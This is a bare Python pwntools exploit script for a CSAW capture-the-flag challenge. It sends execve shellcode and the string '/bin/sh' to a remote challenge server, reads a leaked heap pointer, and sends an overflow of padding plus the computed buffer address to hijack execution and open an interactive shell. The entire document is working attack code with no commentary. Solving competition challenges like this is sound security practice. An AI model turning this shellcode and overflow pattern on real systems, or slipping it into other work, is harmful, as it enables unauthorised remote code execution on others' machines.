#!/usr/bin/env python
from pwn import *
p = '\x48\x31\xc0\x50\x5e\x99\x5f\x48\x89\xe7\xb0\x3b\x0f\x05'
 
r = remote('pwn.chal.csaw.io', 9005)
 
r.recvlines(4)
r.sendline(p)
r.recvline()
r.sendline('/bin/sh' + '\x00')
r.recvuntil('node.next: ')
leak = int(r.recvline(False), 16)
buf = leak + 0x28
r.recvlines(3)
r.sendline('A' * 11 + p64(buf))
r.recvline()
r.interactive()